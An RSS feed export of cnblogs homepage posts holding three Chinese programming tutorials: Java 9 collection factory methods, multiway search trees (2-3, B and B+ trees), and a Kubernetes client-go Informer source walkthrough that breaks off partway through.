<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>java9第5篇-Collection集合类的增强与优化 - 字母哥博客</title>
<link>http://www.cnblogs.com/zimug/p/13833383.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zimug/p/13833383.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1815316/202010/1815316-20201018070652705-1065067543.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我计划在后续的一段时间内，写一系列关于java 9的文章，虽然java 9 不像Java 8或者Java 11那样的核心java版本，但是还是有很多的特性值得关注。期待您能关注我，我将把java 9 写成一系列的文章，大概十篇左右，本文是第5篇。&lt;/p&gt;
&lt;p&gt;本文带大家快速的了解一下在Java 9 种集合类Colleaction子类都发生了哪些比较有用的变化与增强。&lt;/p&gt;
&lt;h2 id=&quot;一、提供of方法创建集合&quot;&gt;一、提供&lt;code&gt;Of()&lt;/code&gt;方法创建集合&lt;/h2&gt;
&lt;h3 id=&quot;11构建set集合对象&quot;&gt;1.1.构建Set集合对象&lt;/h3&gt;
&lt;p&gt;Java 9 提供了一系列的工厂方法of()来更加简便的构建Set集合对象。使用of()方法构建java.util.Set我们就不用一个元素一个元素的add()数据了。但需要注意的是：这种方法构建的Set集合类对象一旦构建就不能更改，不能再新增集合元素。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Set&amp;lt;Integer&amp;gt; integers = Set.of(2, 6, 7, 10);
System.out.println(integers);  //[2, 10, 6, 7]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;还有许多重载的of()工厂方法供我们使用&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; of()//空的set
 of(E)
 of(E, E)
 of(E, E, E)
 //更多 ......
 of(E, E, E, E, E, E, E, E, E, E )// 一直到十个元素
 of(E...)//更多参数
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;12构建list集合对象&quot;&gt;1.2.构建List集合对象&lt;/h3&gt;
&lt;p&gt;和Set集合类似，List集合类也新增了一系列的of()工厂函数,创建不可变的List集合对象。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; List&amp;lt;Integer&amp;gt; integers = List.of(2, 6, 7, 10);
 System.out.println(integers); // [2, 6, 7, 10]
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;13构建map对象&quot;&gt;1.3.构建Map对象&lt;/h3&gt;
&lt;p&gt;虽然Map不是Colleaction的子类，但是我们一般也把它当作集合类学习。Map类同样新增了一系列的of()工厂函数,创建不可变的Map对象。唯一的区别是使用Key/Value的形式传递参数。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; Map&amp;lt;Integer, String&amp;gt; map = Map.of(2, &quot;two&quot;, 6, &quot;six&quot;);
 System.out.println(map); // {2=two, 6=six}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;14使用mapofentries-和-mapentry&quot;&gt;1.4.使用Map.ofEntries() 和 Map.entry()&lt;/h3&gt;
&lt;p&gt;工厂方法&lt;code&gt;Map.ofEntries&lt;/code&gt;接受Map.Entry作为varargs。还有另一个相关的新静态方法&lt;code&gt;Map.entry(K, V)&lt;/code&gt;来创建Entry实例。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; Map&amp;lt;Integer, String&amp;gt; map = Map.ofEntries(Map.entry(2, &quot;two&quot;), Map.entry(4, &quot;four&quot;));
 System.out.println(map); //{2=two, 4=four}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;二、arrays&quot;&gt;二、Arrays&lt;/h2&gt;
&lt;p&gt;Arrays是我们进行集合操作的工具类，在Java 9 版本中也进行了增强。&lt;/p&gt;
&lt;h3 id=&quot;21arraysmismatch&quot;&gt;2.1.&lt;code&gt;Arrays.mismatch()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;这些新方法用于查找两个数组之间的第一个不匹配索引。例如，下面的代码查找两个整数数组之间的第一个不匹配项。如果没有不匹配，则此方法将返回-1。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;int[] ints1 = {1, 3, 5, 7, 9};
int[] ints2 = {1, 3, 5, 6, 7};
int i = Arrays.mismatch(ints1, ints2);
System.out.println(i); //3
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;另一个这样的方法接受fromIndex和toIndex参数来查找相对不匹配的索引。例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; int mismatch(int[] a, int aFromIndex, int aToIndex, 
                int[] b, int bFromIndex, int bToIndex)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从arrayA的索引第1个元素，arrayB索引第2个元素开始的区间内，进行第一个不匹配项目的查找。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; int[] arrayA = {-2, 1, 3, 5, 7, 9};
 int[] arrayB = {-1, 0, 1, 3, 5, 7, 10};
 int j = Arrays.mismatch(arrayA, 1, arrayA.length, arrayB, 2, arrayB.length);
 System.out.println(j);
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;22arraysequals&quot;&gt;2.2.&lt;code&gt;Arrays.equals()&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;和&lt;code&gt;Arrays.mismatch()&lt;/code&gt;有些相似，&lt;code&gt;Arrays.equals()&lt;/code&gt; 用来判断两个数组区间内的元素是否相等。新方法为两个被比较的数组新增了fromIndex和toIndex参数。这些方法根据两个数组的相对索引位置检查两个数组的相等性。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; String[] sa = {&quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;};
 String[] sb = {&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;};
 boolean b = Arrays.equals(sa, 0, 2, sb, 3, 5);
 System.out.println(b);  //true
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从sa数组的索引0-2，与sb数组的索引3-5的元素进行比对。结果为true相等。&lt;/p&gt;
&lt;h2 id=&quot;欢迎关注我的博客，里面有很多精品合集&quot;&gt;欢迎关注我的博客，里面有很多精品合集&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;本文转载注明出处（必须带连接，不能只转文字）：&lt;a href=&quot;http://www.zimug.com&quot;&gt;字母哥博客&lt;/a&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;觉得对您有帮助的话，帮我点赞、分享！您的支持是我不竭的创作动力！&lt;/strong&gt; 。另外，笔者最近一段时间输出了如下的精品内容，期待您的关注。&lt;/p&gt;
</description>
<pubDate>Sat, 17 Oct 2020 23:07:00 +0000</pubDate>
<dc:creator>字母哥博客</dc:creator>
<og:description>我计划在后续的一段时间内，写一系列关于java 9的文章，虽然java 9 不像Java 8或者Java 11那样的核心java版本，但是还是有很多的特性值得关注。期待您能关注我，我将把java 9</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zimug/p/13833383.html</dc:identifier>
</item>
<item>
<title>多路查找树（2-3 树、2-3-4 树、B 树、B+ 树） - 低吟不作语</title>
<link>http://www.cnblogs.com/Yee-Q/p/13833316.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Yee-Q/p/13833316.html</guid>
<description>&lt;br/&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;本文参考自《大话数据结构》&lt;/p&gt;
&lt;/blockquote&gt;&lt;br/&gt;&lt;h2 id=&quot;计算机中数据的存储&quot;&gt;计算机中数据的存储&lt;/h2&gt;
&lt;p&gt;一般而言，我们都是在内存中处理数据，但假如我们要操作的数据集非常大，内存无法处理了，在这种情况下对数据的处理需要不断地从硬盘等存储设备中调入或调出内存页面。&lt;/p&gt;
&lt;p&gt;对外存设备的读写，效率并不乐观。为了降低对外存设备的访问次数，我们需要新的数据结构来处理这个问题。之前学习过的树，一个结点可以有多个孩子，但它自身只能存储一个元素。二叉树限制更多，只有两个孩子结点。在元素非常多时，要么树的度非常大（结点拥有子树的个数的最大值），要么树的高度非常大，如果我们要查找某一元素，必须多次访问外存设备，这迫使我们要打破每一个结点只能存储一个元素的限制，引入多路查找树的概念。&lt;/p&gt;
&lt;p&gt;多路查找树，其每一个结点的孩子数可以多于两个，且一个结点可以存储多个元素。由于它是查找树，所有元素之间存在某种特定的排序关系。&lt;/p&gt;
&lt;br/&gt;&lt;h2 id=&quot;2-3-树和-2-3-4-树&quot;&gt;2-3 树和 2-3-4 树&lt;/h2&gt;
&lt;p&gt;2-3 树是拥有以下性质的多路查找树：&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;每一个结点都具有两个孩子（称为 2 结点）获三个孩子（称为 3 孩子）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;一个 2 结点包含一个元素和两个孩子（或没有孩子），左子树包含的元素小于该元素，右子树包含的元素大于该元素&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;一个 3 结点包含一大一小两个元素和三个孩子（或没有孩子），左子树包含的元素小于较小元素，右子树包含的元素大于较大元素，中间子树包含介于两个元素之间的元素&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;2-3 树中所有的叶子结点都在同一层次上&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202010/1759254-20201018014507423-1385535439.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;对于 2-3 树，查找某一元素的方法与二叉排序树一样。要判断一个元素是否存在，我们先将待查找元素和根节点比较，如果它和其中任意一个相等，那查找命中；否则根据比较的结果来选择查找的方向。&lt;/p&gt;
&lt;p&gt;要对 2-3 树插入元素，如果是一颗空树，直接创建一个 2 结点即可，如果不是空树，则要考虑以下情况：&lt;/p&gt;
&lt;ul readability=&quot;4&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;插入结点到一个 2 结点，可直接将 2 结点转换为 3 结点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202010/1759254-20201018014531700-1631137624.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;插入结点到一个 3 结点，其父结点为 2 结点&lt;/p&gt;
&lt;p&gt;如果命中查找结束于 3 结点，先临时将其成为 4 结点，把待插入元素添加到其中，然后将 4 结点转化为 3 个 2 结点，中间的结点成为左右结点的父结点，并与父结点为合并。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202010/1759254-20201018014601333-608906046.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;插入结点到一个 3 结点，其父结点为 3 结点&lt;/p&gt;
&lt;p&gt;插入元素后一直向上分解临时的 4 节点，直到遇到 2 节点的父节点变成 3 节点不再分解为止。如果达到树根节点还是 4 节点，则分解根节点，此时树高加一（只有分解根节点才会增加树高）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202010/1759254-20201018014614194-66156125.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;对于 2-3 树的删除，如果对前面插入的理解到位的话，就不是难事了。相比于插入，删除的情况较多，如果逐一介绍就太浪费时间了，总的来说它是有规律的。&lt;/p&gt;
&lt;p&gt;2-3-4 树其实就是 2-3 树的概念扩展，它多了一个 4 结点。一个 4 结点包含小中大三个元素和四个孩子（或没有孩子），左子树包含小于最小元素的元素；第二子树包含大于最小元素，小于第二元素的元素；第三子树包含大于第二元素，小于最大元素的元素；右子树包含大于最大元素的元素。&lt;/p&gt;
&lt;br/&gt;&lt;h2 id=&quot;b-树和-b-树&quot;&gt;B 树和 B+ 树&lt;/h2&gt;
&lt;p&gt;B 树是一种平衡的多路查找树，2-3 树和 2-3-4 树都是 B 树的特例，结点所拥有的最大孩子树称为 B 树的阶，因此，2-3 树是 3 阶 B 树，2-3-4 树是 4 阶 B 树。&lt;/p&gt;
&lt;p&gt;一个 m 阶的 B 树具有如下属性：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果根结点不是叶结点，则至少有两颗子树&lt;/li&gt;
&lt;li&gt;每一个非根的分支结点都有 k-1 个元素和 k 个孩子&lt;/li&gt;
&lt;li&gt;所有叶子结点都处于同一层次&lt;/li&gt;
&lt;li&gt;值位于 k-1 和 k 之间的子结点，都位于 k-1 和 k 对应的 value 之间&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202010/1759254-20201018014632947-1646329318.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;B 树的插入和删除和 2-3 树或 2-3-4 树是类似的，只不过阶数可能会很大而已。B 树可以帮助我们减少内存与外存之间数据的频繁交换，假设一颗 B 树的阶是 1001，高度为 2，它可以存储超过 10 亿个关键字。我们只要让根结点持久保留在内存中，那么寻找一个关键字至多只需要两次硬盘的读取。而如果使用二叉树，那就不得了了，光是树的高度就不知道比使用 B 大到哪里去，对硬盘的读取次数自然也多得多。&lt;/p&gt;
&lt;p&gt;B 树还是有缺陷的，如果我们要遍历一颗 B 树，必须往返于每个结点之间，也就意味着得多次访问硬盘，有没有可能让遍历时每个元素只访问一次呢？我们在原有的 B 树结构基础上，加上新的元素组织形式，这就是 B+ 树。&lt;/p&gt;
&lt;p&gt;B+ 树与 B 树的差异在于：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;B+ 树的分支结点不保存关键字，只进行数据索引，结点中仅含有其子树中的最大（或最小）关键字&lt;/li&gt;
&lt;li&gt;B+ 树所有的叶子结点包含全部关键字信息，及指向含这些关键字记录的指针，叶子结点本身依关键字的大小从小到大顺序链接&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1759254/202010/1759254-20201018014648925-1325480519.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;B+ 所有关键字数据地址都存在叶子节点上，所以每次查找的次数都相同，查询效率也比 B 树稳定。B+ 树也结点遍历速度更快，因为只需要从最左侧的叶子结点出发，一直沿着指向下一叶子结点的指针遍历即可。另外，B+ 树天然具备排序功能，因此特别适合带有范围的查找。&lt;/p&gt;
&lt;br/&gt;</description>
<pubDate>Sat, 17 Oct 2020 17:47:00 +0000</pubDate>
<dc:creator>低吟不作语</dc:creator>
<og:description>本文参考自《大话数据结构》 计算机中数据的存储 一般而言，我们都是在内存中处理数据，但假如我们要操作的数据集非常大，内存无法处理了，在这种情况下对数据的处理需要不断地从硬盘等存储设备中调入或调出内存页</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Yee-Q/p/13833316.html</dc:identifier>
</item>
<item>
<title>16.深入k8s：Informer使用及其源码分析 - luozhiyun</title>
<link>http://www.cnblogs.com/luozhiyun/p/13833160.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/luozhiyun/p/13833160.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img.luozhiyun.com/20201018000039.jpg&quot; alt=&quot;63831060_p0_master1200&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;6.0591397849462&quot;&gt;
&lt;p&gt;转载请声明出处哦~，本篇文章发布于luozhiyun的博客：&lt;a href=&quot;https://www.luozhiyun.com&quot;&gt;https://www.luozhiyun.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;由于这部分的代码是在client-go 中，所以使用的源码版本是client-go 1.19&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这次讲解我用了很一些图，尽可能的把这个模块给描述清楚，如果感觉对你有所帮助不妨发一封邮件激励一下我~&lt;/p&gt;
&lt;h2 id=&quot;informer机制&quot;&gt;Informer机制&lt;/h2&gt;
&lt;h3 id=&quot;机制设计&quot;&gt;机制设计&lt;/h3&gt;
&lt;p&gt;Informer主要有两个作用：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;通过一种叫作 ListAndWatch 的方法，把 APIServer 中的 API 对象缓存在了本地，并负责更新和维护这个缓存。ListAndWatch通过 APIServer 的 LIST API“获取”所有最新版本的 API 对象；然后，再通过 WATCH API 来“监听”所有这些 API 对象的变化；&lt;/li&gt;
&lt;li&gt;注册相应的事件，之后如果监听到的事件变化就会调用事件对应的EventHandler，实现回调。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Informer运行原理如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img.luozhiyun.com/20201018000043.png&quot; alt=&quot;image-20201017000845410&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;根据流程图来解释一下Informer中几个组件的作用：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Reflector：用于监控指定的k8s资源，当资源发生变化时，触发相应的变更事件，如Added事件、Updated事件、Deleted事件，并将器资源对象放到本地DeltaFIFO Queue中；&lt;/li&gt;
&lt;li&gt;DeltaFIFO：DeltaFIFO是一个先进先出的队列，可以保存资源对象的操作类型；&lt;/li&gt;
&lt;li&gt;Indexer：用来存储资源对象并自带索引功能的本地存储，Reflector从DeltaFIFO中将消费出来的资源对象存储至Indexer；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Reflector 包会和 apiServer 建立长连接，并使用 ListAndWatch 方法获取并监听某一个资源的变化。List 方法将会获取某个资源的所有实例，Watch 方法则监听资源对象的创建、更新以及删除事件，然后将事件放入到DeltaFIFO Queue中；&lt;/p&gt;
&lt;p&gt;然后Informer会不断的从 Delta FIFO Queue 中 pop 增量事件，并根据事件的类型来决定新增、更新或者是删除本地缓存；接着Informer 根据事件类型来触发事先注册好的 Event Handler触发回调函数，然后然后将该事件丢到 Work Queue 这个工作队列中。&lt;/p&gt;
&lt;h3 id=&quot;实例&quot;&gt;实例&lt;/h3&gt;
&lt;p&gt;将到了go-client部分的代码，我们可以直接通过实例来进行上手跑动，Informers Example代码示例如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;package main

import (
        &quot;flag&quot;
        v1 &quot;k8s.io/apimachinery/pkg/apis/meta/v1&quot;
        &quot;k8s.io/client-go/informers&quot;
        &quot;k8s.io/client-go/kubernetes&quot;
        &quot;k8s.io/client-go/tools/cache&quot;
        &quot;k8s.io/client-go/tools/clientcmd&quot;
        &quot;k8s.io/client-go/util/homedir&quot;
        &quot;log&quot;
        &quot;path/filepath&quot;
        &quot;time&quot;
)

func main() {
        var kubeconfig *string
        //如果是windows，那么会读取C:\Users\xxx\.kube\config 下面的配置文件
        //如果是linux，那么会读取~/.kube/config下面的配置文件
        if home := homedir.HomeDir(); home != &quot;&quot; {
                kubeconfig = flag.String(&quot;kubeconfig&quot;, filepath.Join(home, &quot;.kube&quot;, &quot;config&quot;), &quot;(optional) absolute path to the kubeconfig file&quot;)
        } else {
                kubeconfig = flag.String(&quot;kubeconfig&quot;, &quot;&quot;, &quot;absolute path to the kubeconfig file&quot;)
        }
        flag.Parse()

        config, err := clientcmd.BuildConfigFromFlags(&quot;&quot;, *kubeconfig)
        if err != nil {
                panic(err)
        }

        clientset, err := kubernetes.NewForConfig(config)
        if err != nil {
                panic(err)
        }

        stopCh := make(chan struct{})
        defer close(stopCh)
        //表示每分钟进行一次resync，resync会周期性地执行List操作
        sharedInformers := informers.NewSharedInformerFactory(clientset, time.Minute)

        informer := sharedInformers.Core().V1().Pods().Informer()

        informer.AddEventHandler(cache.ResourceEventHandlerFuncs{
                AddFunc: func(obj interface{}) {
                        mObj := obj.(v1.Object)
                        log.Printf(&quot;New Pod Added to Store: %s&quot;, mObj.GetName())
                },
                UpdateFunc: func(oldObj, newObj interface{}) {
                        oObj := oldObj.(v1.Object)
                        nObj := newObj.(v1.Object)
                        log.Printf(&quot;%s Pod Updated to %s&quot;, oObj.GetName(),nObj.GetName())
                },
                DeleteFunc: func(obj interface{}) {
                        mObj := obj.(v1.Object)
                        log.Printf(&quot;Pod Deleted from Store: %s&quot;, mObj.GetName())
                },
        })

        informer.Run(stopCh)
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;要运行这段代码，需要我们将k8s服务器上的~/.kube代码拷贝到本地，我是win10的机器所以拷贝到&lt;code&gt;C:\Users\xxx\.kube&lt;/code&gt;中。&lt;/p&gt;
&lt;p&gt;informers.NewSharedInformerFactory会传入两个参数，第1个参数clientset是用于与k8s apiserver交互的客户端，第2个参数是代表每分钟会执行一次resync，resync会周期性执行List将所有资源存放再Informer Store中，如果该参数是0，则禁用resync功能。&lt;/p&gt;
&lt;p&gt;通过informer.AddEventHandler函数可以为pod资源添加资源事件回调方法，支持3种资源事件回调方法：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;AddFunc&lt;/li&gt;
&lt;li&gt;UpdateFunc&lt;/li&gt;
&lt;li&gt;DeleteFunc&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;通过名称我们就可以知道是新增、更新、删除时会回调这些方法。&lt;/p&gt;
&lt;p&gt;在我们初次执行run方法的时候，可以会将监控的k8s上pod存放到本地，并回调AddFunc方法，如下日志：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;2020/10/17 15:13:10 New Pod Added to Store: dns-test
2020/10/17 15:13:10 New Pod Added to Store: web-1
2020/10/17 15:13:10 New Pod Added to Store: fluentd-elasticsearch-nwqph
2020/10/17 15:13:10 New Pod Added to Store: kube-flannel-ds-amd64-bjmt2
2020/10/17 15:13:10 New Pod Added to Store: kubernetes-dashboard-65665f84db-jrw6k
2020/10/17 15:13:10 New Pod Added to Store: mongodb
2020/10/17 15:13:10 New Pod Added to Store: web-0
....
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;源码解析&quot;&gt;源码解析&lt;/h2&gt;
&lt;h3 id=&quot;初始化&quot;&gt;初始化&lt;/h3&gt;
&lt;h4 id=&quot;shared-informer初始化&quot;&gt;shared Informer初始化&lt;/h4&gt;
&lt;p&gt;shared Informer初始化的时候会调用到informers.NewSharedInformerFactory进行初始化。&lt;/p&gt;
&lt;p&gt;文件位置：informers/factory.go&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func NewSharedInformerFactory(client kubernetes.Interface, defaultResync time.Duration) SharedInformerFactory {
        return NewSharedInformerFactoryWithOptions(client, defaultResync)
}

func NewSharedInformerFactoryWithOptions(client kubernetes.Interface, defaultResync time.Duration, options ...SharedInformerOption) SharedInformerFactory {
        factory := &amp;amp;sharedInformerFactory{
                client:           client,
                namespace:        v1.NamespaceAll,
                defaultResync:    defaultResync,
                informers:        make(map[reflect.Type]cache.SharedIndexInformer),
                startedInformers: make(map[reflect.Type]bool),
                customResync:     make(map[reflect.Type]time.Duration),
        }

        // Apply all options
        for _, opt := range options {
                factory = opt(factory)
        }

        return factory
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;NewSharedInformerFactory方法最终会调用到NewSharedInformerFactoryWithOptions初始化一个sharedInformerFactory，在初始化的时候会初始化一个informers，用来缓存不同类型的informer。&lt;/p&gt;
&lt;h4 id=&quot;informer-初始化&quot;&gt;informer 初始化&lt;/h4&gt;
&lt;p&gt;informer初始化会调用sharedInformerFactory的方法进行初始化，并且可以调用不同资源的Informer。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt; podInformer := sharedInformers.Core().V1().Pods().Informer()
        nodeInformer := sharedInformers.Node().V1beta1().RuntimeClasses().Informer()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;定义不同资源的Informer可以用来监控node或pod。&lt;/p&gt;
&lt;p&gt;通过调用Informer方法会根据类型来创建Informer，同一类资源会共享同一个informer。&lt;/p&gt;
&lt;p&gt;文件路径：informers/factory.go&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;
func (f *podInformer) defaultInformer(client kubernetes.Interface, resyncPeriod time.Duration) cache.SharedIndexInformer {
    //创建informer
        return NewFilteredPodInformer(client, f.namespace, resyncPeriod, cache.Indexers{cache.NamespaceIndex: cache.MetaNamespaceIndexFunc}, f.tweakListOptions)
}

func (f *podInformer) Informer() cache.SharedIndexInformer {
    //传入上面定义的defaultInformer方法，用于创建informer
        return f.factory.InformerFor(&amp;amp;corev1.Pod{}, f.defaultInformer)
}

func (f *sharedInformerFactory) InformerFor(obj runtime.Object, newFunc internalinterfaces.NewInformerFunc) cache.SharedIndexInformer {
        f.lock.Lock()
        defer f.lock.Unlock()
        //获取informer类型
        informerType := reflect.TypeOf(obj)
    //查找map缓存,如果存在,那么直接返回
        informer, exists := f.informers[informerType]
        if exists {
                return informer
        }
        //根据类型查找resync的周期
        resyncPeriod, exists := f.customResync[informerType]
        if !exists {
                resyncPeriod = f.defaultResync
        }
        //调用defaultInformer方法创建informer
        informer = newFunc(f.client, resyncPeriod)
        f.informers[informerType] = informer

        return informer
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;调用InformerFor方法的时候会传入defaultInformer方法用于创建informer。&lt;/p&gt;
&lt;p&gt;InformerFor方法里面首先会去sharedInformerFactory的map缓存中根据类型查找对应的informer，如果存在那么直接返回，如果不存在，那么则会调用newFunc方法创建informer，然后设置到informers缓存中。&lt;/p&gt;
&lt;p&gt;下面我们看一下NewFilteredPodInformer是如何创建Informer的：&lt;/p&gt;
&lt;p&gt;文件位置：informers/core/v1/pod.go&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func NewFilteredPodInformer(client kubernetes.Interface, namespace string, resyncPeriod time.Duration, indexers cache.Indexers, tweakListOptions internalinterfaces.TweakListOptionsFunc) cache.SharedIndexInformer {
        return cache.NewSharedIndexInformer(
                &amp;amp;cache.ListWatch{
                        ListFunc: func(options metav1.ListOptions) (runtime.Object, error) {
                                if tweakListOptions != nil {
                                        tweakListOptions(&amp;amp;options)
                                }
                                //调用apiserver获取pod列表
                                return client.CoreV1().Pods(namespace).List(context.TODO(), options)
                        },
                        WatchFunc: func(options metav1.ListOptions) (watch.Interface, error) {
                                if tweakListOptions != nil {
                                        tweakListOptions(&amp;amp;options)
                                }
                                //调用apiserver监控pod列表
                                return client.CoreV1().Pods(namespace).Watch(context.TODO(), options)
                        },
                },
                &amp;amp;corev1.Pod{},
                resyncPeriod,
                indexers,
        )
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里是真正的创建一个informer，并注册了List&amp;amp;Watch的回调函数，list回调函数的api类似下面这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt; result = &amp;amp;v1.PodList{}
        err = c.client.Get().
                Namespace(c.ns).
                Resource(&quot;pods&quot;).
                VersionedParams(&amp;amp;opts, scheme.ParameterCodec).
                Timeout(timeout).
                Do(ctx).
                Into(result)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;构造Informer通过NewSharedIndexInformer完成：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-go&quot;&gt;func NewSharedIndexInformer(lw ListerWatcher, exampleObject runtime.Object, defaultEventHandlerResyncPeriod time.Duration, indexers Indexers) SharedIndexInformer {
        realClock := &amp;amp;clock.RealClock{}
        sharedIndexInformer := &amp;amp;sharedIndexInformer{
                processor:                       &amp;amp;sharedProcessor{clock: realClock},
                indexer:                         NewIndexer(DeletionHandlingMetaNamespaceKeyFunc, indexers),
                listerWatcher:                   lw,
                objectType:                      exampleObject,
                resyncCheckPeriod:               defaultEventHandlerResyncPeriod,
                defaultEventHandlerResyncPeriod: defaultEventHandlerResyncPeriod,
                cacheMutationDetector:           NewCacheMutationDetector(fmt.Sprintf(&quot;%T&quot;, exampleObject)),
                clock:                           realClock,
        }
        return sharedIndexInformer
}
&lt;/code&gt;
&lt;/pre&gt;
